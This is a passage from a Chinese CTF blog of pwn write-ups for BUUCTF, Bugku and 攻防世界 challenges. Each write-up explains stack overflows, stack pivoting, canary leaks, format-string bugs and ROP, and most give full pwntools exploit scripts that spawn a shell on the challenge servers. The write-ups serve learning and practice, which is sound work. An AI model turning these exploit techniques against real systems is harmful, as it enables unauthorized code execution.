read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><p>知识补充：<a target="_blank" rel="noopener" href="https://wiki.mrskye.cn/Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移 - SkYe Wiki (mrskye.cn)</a></p>
<p>wp参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/remon535/p/13507217.html">pwn-ciscn_2019_es_2(栈迁移) - remon535 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mio-yy/p/15033931.html">ciscn_2019_es_2 - mio_yy - 博客园 (cnblogs.com)</a></p>
<blockquote>
<p>栈迁移核心思想就是利用leave和ret转移ebp和esp。leave和ret常用于复原栈</p>
<p>leave=mov esp,ebp</p>
<p>pop ebp</p>
<p>ret=pop eip</p>
</blockquote>
<p>查</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211027201100380.png" alt="image-20211027201100380"></p>
<p>IDA跟进vul发现溢出点</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211027201155997.png" alt="image-20211027201155997"></p>
<p>溢出的空间不足。read大小为0x30，s变量和ebp距离为0x28。只能覆盖ebp和ret。使用栈迁移解决栈空间不足的问题。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27101)</span></span><br><span class="line">p=process(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">sys_plt=<span class="number">0x8048400</span></span><br><span class="line">leave_ret=<span class="number">0x8048562</span></span><br><span class="line"></span><br><span class="line">py=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name?\n&#x27;</span>,py)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys_plt)+p32(<span class="number">0</span>)+p32(ebp-<span class="number">0x28</span>)+<span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">payload+=p32(ebp-<span class="number">0x38</span>)+p32(leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h3><p>有fopen函数，相当于backdoor</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./guestbook&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29850</span>)</span><br><span class="line">sh = <span class="number">0x0400620</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(sh) </span><br><span class="line">p.recvuntil(<span class="string">&quot;message:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h3><p>法一：peta调试。wp参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45691294/article/details/112114073">(13条消息) ez_pz_hackover_2016_沫忆末忆的博客-CSDN博客_ez_pz_hackover_2016</a></p>
<p>查</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211101203620034.png" alt="image-20211101203620034"></p>
<p>NX也没开，第一时间想到用ret2shellcode打，运行看</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211101203803396.png" alt="image-20211101203803396"></p>
<p>IDA里跟进chall，是主结构</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211101203707855.png" alt="image-20211101203707855"></p>
<p>没后门，保护全关，确定ret2shellcode。看代码得知，先打印出的来的地址是s的缓冲区地址，接收一个大小不超过1023字节的输入到s缓冲区，然后将缓冲区里换行符后面的内容全部置为0，最后将缓冲区内容与”crashme”这个字符串作比较，如果相同就会进入到vuln函数（这里很明显s是无法溢出的）</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211101204410194.png" alt="image-20211101204410194"></p>
<p>memcpy函数，将第一个参数长度的内容复制到dest</p>
<p>所以。因为输入到s缓冲区的内容长度不够，无法实现溢出，利用vuln函数就可以把构造好的shellcode放入到栈中进行执行，要执行shellcode则要知道shellcode的地址，而chall函数在执行时就已经把s缓冲区的地址打印出来，最后计算s缓冲区和shellcode地址的相对偏移量，动调计算偏移就会得到shellcode的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29966</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;lets crash: &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">shellcode_addr = stack_addr-<span class="number">28</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;crashme\x00&#x27;</span>.ljust(<span class="number">26</span>,<span class="string">&quot;\x00&quot;</span>)+p32(shellcode_addr)+shellcode</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>法二：pwndbg调试。wp参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xlrp/p/14273703.html">BUUCTF]PWN——ez_pz_hackover_2016 - Angel-Yan - 博客园 (cnblogs.com)</a></p>
<p>利用思路也是往s参数里写入shellcode，执行vuln函数后让dest造成溢出，将返回地址修改为shellcode的地址去执行</p>
<p>接下来动调，找vuln函数里一个nop下断点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x8048600&#x27;</span>)<span class="comment">#利用gdb动调，在0x8048600处下了个断点</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)<span class="comment">#接收回显的参数s在栈上的地址，长度是10，以16进制表示</span></span><br><span class="line">print(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span><span class="comment">#前面的crashme\x00绕过if判断</span></span><br><span class="line">      <span class="comment">#后面的aaaa是测试数据，去栈上找它的地址</span></span><br><span class="line">      <span class="comment">#利用它找到返回地址在栈上的地址，将返回地址覆盖为shellcode</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
<p>执行脚本，c执行到断点处，查看栈的布局情况   <code>stack 30</code></p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211102150836424.png" alt="image-20211102150836424"></p>
<p>ebp位置：0x38</p>
<p>返回地址是ebp下面即：0x3c（刚好是0x38+4）</p>
<p>输入参数的位置：0x22（看的到”ashme”，“cr”在前面，它们的ascii码是63和72，72 63分别对应0x23，0x22，后两位依次是0x21，0x20）</p>
<p>所以ebp是距离输入点的0x38-0x22=0x16，shellcode位置写在他之后即0x16+4=0x1a（32位下ebp占4字节）</p>
<p>最后找shellcode导向的地址就行了！</p>
<p>首先，调试输出来的地址就是s的地址，保存在了stack变量中</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211102150912458.png" alt="image-20211102150912458"></p>
<p>而shellcode要导向的地址，也就是栈溢出覆盖后返回地址的下面，所以shellcode是0xffa28110，那么shellcode的地址在0xffa28110也就是s上面即 0xffa2812c-0xffa28110=0x1c的位置，即address=stack-0x1c。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x8048600&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(r.recv(r10),<span class="number">16</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#print hex(stack)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>+<span class="number">4</span>)+p32(stack-<span class="number">0x1c</span>)+shellcode<span class="comment">#其中有8个字节是&quot;crashme\x00”，所以减个8</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ctfhub"><a href="#ctfhub" class="headerlink" title="ctfhub"></a>ctfhub</h2>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/" class="post-title-link" itemprop="url">bugku-pwn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-11-05 15:32:50 / 修改时间：15:33:45" itemprop="dateCreated datePublished" datetime="2021-11-05T15:32:50+08:00">2021-11-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Bin/" itemprop="url" rel="index"><span itemprop="name">Bin</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h2><h3 id="read-note"><a href="#read-note" class="headerlink" title="read_note"></a>read_note</h3><p>照例</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210804161834106.png" alt="image-20210804161834106"></p>
<p>但是。。直接运行</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210804161915718.png" alt="image-20210804161915718"></p>
<p>我人傻了，交了就是</p>
<p>正规解法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/kety_gz/article/details/100516666">Bugkupwn3</a></p>
<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>wp参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/357337474">bugku pwn4 canary)</a></p>
<p>照例</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805000302137.png" alt="image-20210805000302137"></p>
<p>IDA</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805000323715.png" alt="image-20210805000323715"></p>
<p>跟进buf</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805000406725.png" alt="image-20210805000406725"></p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805000413778.png" alt="image-20210805000413778"></p>
<p>char buf; // [rsp+10h] [rbp-240h]</p>
<p>0x240-0x8=0x238 换算成十进制为568</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805001801297.png" alt="image-20210805001801297"></p>
<p>所以第一个覆盖点用“a*568”或者0x238</p>
<p>跟进v5</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805000449958.png" alt="image-20210805000449958"></p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805000500127.png" alt="image-20210805000500127"></p>
<p>char v5; // [rsp+40h] [rbp-210h]</p>
<p>0x210-0x8=0x208 换算成十进制为520</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805001912276.png" alt="image-20210805001912276"></p>
<p>所以第二个覆盖点用“a*520”或者0x208</p>
<p>记录下system地址0x400660</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805004126641.png" alt="image-20210805004126641"></p>
<p>找canary</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805002605859.png" alt="image-20210805002605859"></p>
<p>关注以下两条语句：</p>
<p>.text:000000000040082C mov rax, fs:28h<br>.text:0000000000400835 mov [rbp+var_8], rax</p>
<p>canary存在rbp+var_8，可以在0x40082C下断点进行gdb动调</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805002723261.png" alt="image-20210805002723261"></p>
<p>单步跟发现</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805002752813.png" alt="image-20210805002752813"></p>
<p>可以观察，随后会把rax的值放在rbp-8的位置，同时也证明我们找canary位置是对的，即rbp-8的位置</p>
<p>所以现在的思路是首先依据第一次回显泄露canary的值，第二次通过利用泄露的canary值实现栈溢出。</p>
<p>64位程序优先通过寄存器rdi传参，所以先找rdi，利用ROPgadget</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn4 --only &quot;pop|rdi|ret&quot;</span><br></pre></td></tr></table></figure>
<p>可以找到如下结果</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805003120339.png" alt="image-20210805003120339"></p>
<p>发现rdi，记录地址0x400963</p>
<p>但是少个/bin/sh，不过ROPgadget有读取字符串地址的功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn4 --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805003328571.png" alt="image-20210805003328571"></p>
<p>记录下地址0x601068</p>
<p>exp就有了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&quot;./pwn4&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;114.67.246.176  &quot;</span>,<span class="number">14314</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Please leave your name(Within 36 Length):&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;A&quot;</span>*<span class="number">568</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;A&quot;</span>*<span class="number">568</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">canary=u64(<span class="string">&#x27;\x00&#x27;</span>+r.recv(<span class="number">7</span>))</span><br><span class="line">sys = <span class="number">0x400660</span></span><br><span class="line">rdi = <span class="number">0x400963</span></span><br><span class="line">sh =<span class="number">0x601068</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">520</span>+p64(canary)+p64(<span class="number">0x1</span>)+p64(rdi)+p64(sh)+p64(sys)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805004328310.png" alt="image-20210805004328310"></p>
<h3 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h3><p>照例</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805193718204.png" alt="image-20210805193718204"></p>
<p>直接IDA</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805193757724.png" alt="image-20210805193757724"></p>
<p>简单的栈溢出<img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805193820581.png" alt="image-20210805193820581"></p>
<p>0x20+8</p>
<p>64位文件下找rdi地址，用ROPgadget</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn5 --only &quot;pop|ret&quot; | grep rdi</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805193926401.png" alt="image-20210805193926401"></p>
<p>IDA找到system地址和/bin/sh地址</p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805194023386.png" alt="image-20210805194023386"></p>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805194031029.png" alt="image-20210805194031029"></p>
<p>exp就有了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&quot;./pwn2&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;114.67.246.176  &quot;</span>,<span class="number">15226</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sys=<span class="number">0x401050</span></span><br><span class="line">sh=<span class="number">0x0000000000402004</span></span><br><span class="line">rdi=<span class="number">0x000000000040126b</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(rdi)+p64(sh)+p64(sys)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Please Input your name.&quot;</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/pwn学习记录/image-20210805194134698.png" alt="image-20210805194134698"></p>
<h3 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h3><p>wp参考：[pwn07 - Bugku CTF](</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/" class="post-title-link" itemprop="url">攻防世界进阶Pwn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-11-05 15:31:46 / 修改时间：15:32:25" itemprop="dateCreated datePublished" datetime="2021-11-05T15:31:46+08:00">2021-11-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Bin/" itemprop="url" rel="index"><span itemprop="name">Bin</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="攻防世界pwn进阶区"><a href="#攻防世界pwn进阶区" class="headerlink" title="攻防世界pwn进阶区"></a>攻防世界pwn进阶区</h2><h3 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h3><p>本题利用思路是先用格式化字符串漏洞泄露canary，之后利用栈溢出，让其返回到后门。</p>
<p>开局经典测格式化字符串的偏移</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102203929373.png" alt="image-20211102203929373"></p>
<p>step=6</p>
<p>canary的偏移，距离是 0x90-8=0x88，填满覆盖canary。之后是0x88/8=17（64位每个格式化字符串8字节，除以8就是一个的），最后17+6=23，leak_canary</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102203440387.png" alt="image-20211102203440387"></p>
<p>栈溢出直接返回后门</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&quot;./pwn4&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">56994</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;3. Exit the battle &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">leak_canary=<span class="string">&#x27;%23$p&#x27;</span></span><br><span class="line">r.sendline(leak_canary)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)<span class="comment">#接收16个字节，以16进制打印</span></span><br><span class="line"><span class="built_in">print</span> (canary)</span><br><span class="line">sh=<span class="number">0x4008da</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h3><p>查</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102212959367.png" alt="image-20211102212959367"></p>
<p>这题其实看着简单，考眼力。。</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102213036065.png" alt="image-20211102213036065"></p>
<p>观察scanf发现v2可以溢出</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102213204003.png" alt="image-20211102213204003"></p>
<p>分析函数的最后发现很明显就用v2覆盖v3，造成栈溢出。由代码看出v2v3之间0x74-0x54=0x20</p>
<p>然后有后门就直接ROP打了</p>
